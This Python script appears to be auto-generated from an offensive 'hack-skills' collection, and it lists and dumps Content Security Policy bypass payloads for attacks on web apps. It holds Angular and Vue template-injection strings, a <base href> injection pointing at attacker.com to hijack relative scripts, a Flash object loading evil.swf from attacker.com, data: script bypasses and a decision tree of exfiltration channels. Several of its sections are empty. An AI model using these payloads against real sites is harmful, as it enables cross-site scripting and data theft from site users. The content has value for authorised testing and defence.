#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/csp-bypass-advanced

Skill: SKILL: CSP Bypass — Advanced Techniques
Desc : >-

Run:  python hack-skills-csp-bypass-advanced.py --help
      python hack-skills-csp-bypass-advanced.py --list
      python hack-skills-csp-bypass-advanced.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/csp-bypass-advanced'
TITLE = 'SKILL: CSP Bypass — Advanced Techniques'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: csp-bypass-advanced", "description: >-", "Advanced Content Security Policy bypass techniques. Use when XSS or data", "exfiltration is blocked by CSP and you need to find policy weaknesses, trusted", "endpoint abuse, nonce leakage, or exfiltration channels that CSP cannot block."],
    'skill-csp-bypass-advanced-techniques': [],
    '0-related-routing': ["- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS vectors to deliver after CSP bypass", "- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) when CSP blocks scripts but HTML injection exists \u2014 exfiltrate without JS", "- [crlf-injection](../crlf-injection/SKILL.md) when CRLF can inject CSP header or steal nonce via response splitting", "- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when both WAF and CSP must be bypassed", "- [clickjacking](../clickjacking/SKILL.md) when CSP lacks `frame-ancestors` \u2014 clickjacking still possible"],
    '1-csp-directive-reference-matrix': ["**Critical insight**: `base-uri`, `form-action`, and `frame-ancestors` do NOT fall back to `default-src`. Their absence is always a potential bypass vector."],
    '2-bypass-techniques-by-directive': [],
    '2-1-script-src-self': ["The app only allows scripts from its own origin. Bypass vectors:"],
    '2-2-script-src-with-cdn-whitelist': ["script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net", "**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`"],
    '2-3-script-src-unsafe-eval': ["`eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` all permitted.", "```javascript", "// Template injection \u2192 RCE-equivalent in browser", "[].constructor.constructor('alert(document.cookie)')()", "// JSON.parse doesn't execute code, but if result is used in eval context:", "// App does: eval('var x = ' + JSON.parse(userInput))"],
    '2-4-script-src-nonce-xxx': ["Only scripts with matching nonce attribute execute."],
    '2-5-script-src-strict-dynamic': ["Trust propagation: any script created by an already-trusted script is also trusted, regardless of source."],
    '2-6-angular-vue-csp-bypass': ["**Angular (with CSP):**", "```html", "<!-- Angular template expression bypasses script-src when angular.js is whitelisted -->", "<div ng-app ng-csp>", "{{$eval.constructor('alert(1)')()}}", "</div>", "<!-- Angular >= 1.6 sandbox removed, so simpler: -->", "{{constructor.constructor('alert(1)')()}}", "**Vue.js:**", "```html", "<!-- Vue 2 with runtime compiler -->", "<div id=app>{{_c.constructor('alert(1)')()}}</div>", "<script src=\"https://whitelisted-cdn/vue.js\"></script>", "<script>new Vue({el:'#app'})</script>"],
    '2-7-missing-object-src': ["If `object-src` is not set (falls back to `default-src`), and `default-src` allows some origins:", "```html", "<!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->", "<object data=\"https://attacker.com/evil.swf\" type=\"application/x-shockwave-flash\">", "<param name=\"AllowScriptAccess\" value=\"always\">", "</object>", "<!-- PDF plugin abuse -->", "<embed src=\"/user-upload/evil.pdf\" type=\"application/pdf\">"],
    '2-8-missing-base-uri': ["```html", "<!-- Inject base tag \u2192 all relative URLs resolve to attacker -->", "<base href=\"https://attacker.com/\">", "<!-- Existing script: <script src=\"/js/app.js\"> -->", "<!-- Now loads: https://attacker.com/js/app.js -->", "This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths."],
    '2-9-missing-frame-ancestors': ["CSP without `frame-ancestors` \u2192 page can be framed \u2192 clickjacking possible.", "`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely."],
    '3-csp-in-meta-tag-vs-header': ["```html", "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\">", "**Meta tag limitations:**", "- Cannot set `frame-ancestors` (ignored in meta)", "- Cannot set `report-uri` / `report-to`", "- Cannot set `sandbox`", "- If injected via HTML injection *before* the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)", "- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)"],
    '4-data-exfiltration-despite-csp': ["When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:", "**DNS-based exfiltration is nearly impossible to block with CSP** \u2014 this is the most reliable channel."],
    '5-csp-bypass-decision-tree': ["CSP present?", "\u251c\u2500\u2500 Read full policy (response headers + meta tags)", "\u251c\u2500\u2500 Check for obvious weaknesses", "\u2502   \u251c\u2500\u2500 'unsafe-inline' in script-src? \u2192 Standard XSS works", "\u2502   \u251c\u2500\u2500 'unsafe-eval' in script-src? \u2192 eval/Function/setTimeout bypass", "\u2502   \u251c\u2500\u2500 * or data: in script-src? \u2192 <script src=\"data:,alert(1)\">", "\u2502   \u2514\u2500\u2500 No CSP header at all on some pages? \u2192 Find CSP-free page", "\u251c\u2500\u2500 Check missing directives", "\u2502   \u251c\u2500\u2500 No base-uri? \u2192 <base href=\"https://attacker.com/\"> \u2192 hijack relative scripts", "\u2502   \u251c\u2500\u2500 No object-src? \u2192 Flash/plugin-based bypass (legacy)", "\u2502   \u251c\u2500\u2500 No form-action? \u2192 Exfil via form submission", "\u2502   \u251c\u2500\u2500 No frame-ancestors? \u2192 Clickjacking possible", "\u2502   \u2514\u2500\u2500 No connect-src falling back to lax default-src? \u2192 fetch/XHR exfil", "\u251c\u2500\u2500 script-src 'self'?", "\u2502   \u251c\u2500\u2500 Find JSONP endpoints on same origin", "\u2502   \u251c\u2500\u2500 Find file upload \u2192 upload .js file", "\u2502   \u251c\u2500\u2500 Find DOM XSS in existing same-origin scripts", "\u2502   \u2514\u2500\u2500 Find Angular/Vue loaded from self \u2192 template injection", "\u251c\u2500\u2500 script-src with CDN whitelist?", "\u2502   \u251c\u2500\u2500 Check CDN for JSONP endpoints", "\u2502   \u251c\u2500\u2500 Check jsdelivr/unpkg/cdnjs \u2192 load attacker-controlled package", "\u2502   \u2514\u2500\u2500 Check *.cloudfront.net \u2192 shared distribution namespace", "\u251c\u2500\u2500 script-src 'nonce-xxx'?", "\u2502   \u251c\u2500\u2500 Nonce reused across requests? \u2192 Replay", "\u2502   \u251c\u2500\u2500 CRLF injection available? \u2192 Inject nonce", "\u2502   \u251c\u2500\u2500 Dangling markup to steal nonce", "\u2502   \u2514\u2500\u2500 Script gadget in trusted scripts", "\u251c\u2500\u2500 script-src 'strict-dynamic'?", "\u2502   \u251c\u2500\u2500 base-uri not set? \u2192 <base> hijack", "\u2502   \u251c\u2500\u2500 DOM XSS in trusted script? \u2192 Inherit trust", "\u2502   \u2514\u2500\u2500 Script gadget creating dynamic scripts from DOM data", "\u2514\u2500\u2500 All script execution blocked?", "\u251c\u2500\u2500 Dangling markup injection \u2192 exfil without JS (see ../dangling-markup-injection/SKILL.md)", "\u251c\u2500\u2500 DNS prefetch exfiltration", "\u251c\u2500\u2500 WebRTC exfiltration", "\u251c\u2500\u2500 CSS injection for data extraction", "\u2514\u2500\u2500 Form action exfiltration"],
    '6-trick-notes-what-ai-models-miss': ["1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** \u2014 these have no fallback. This is the #1 CSP mistake.", "2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.", "3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH \u2014 the effective policy is the intersection (most restrictive).", "4. **`Content-Security-Policy-Report-Only`** does not enforce \u2014 it only reports. Check for the correct header name.", "5. **Nonce length matters**: Nonces should be \u2265128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.", "6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` \u2014 this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.", "7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src=\"data:text/javascript,alert(1)\">` \u2014 trivial bypass, but commonly seen in real-world CSPs."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()